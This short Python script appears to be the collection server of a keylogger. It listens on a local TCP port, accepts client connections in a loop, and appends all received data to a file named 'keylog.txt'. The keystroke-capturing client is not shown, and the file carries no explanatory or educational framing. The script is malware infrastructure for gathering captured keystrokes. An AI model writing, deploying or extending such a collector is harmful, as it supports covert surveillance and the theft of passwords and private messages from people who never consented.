import socket

HOST = '127.0.0.1' 
PORT = 65432        
file = open("keylog.txt", "w")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
    server_socket.bind((HOST, PORT))  
    server_socket.listen()             
    print(f"Server is listening on {HOST}:{PORT}...")

    while True:
        client_socket, client_address = server_socket.accept()
        with client_socket:
            print(f"Connected by {client_address}")
            while True:
              data = client_socket.recv(1024)
              if not data:
                print("Client disconnected.")
                break
            
              file.write(data.decode())
              file.flush()
            
